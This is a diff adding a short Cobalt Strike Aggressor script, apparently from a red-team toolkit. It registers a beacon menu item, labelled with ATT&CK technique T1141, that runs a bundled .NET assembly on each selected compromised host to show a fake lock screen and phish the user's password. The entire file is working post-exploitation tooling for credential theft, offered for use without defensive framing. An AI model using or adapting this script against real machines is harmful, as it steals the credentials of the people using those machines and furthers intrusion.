@@ -1,0 +1,14 @@
+#Run Lock Screen Phishing Exploit
+					
+		item "Show Lockscreen to Phish Password  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					lockscreen($bid);
+				}
+			}
+			
+			
+# Phish Users with fake lockscreen
+sub lockscreen{
+bexecute_assembly($1, script_resource('/exe/WindowsFormsApp9.exe'));
+}
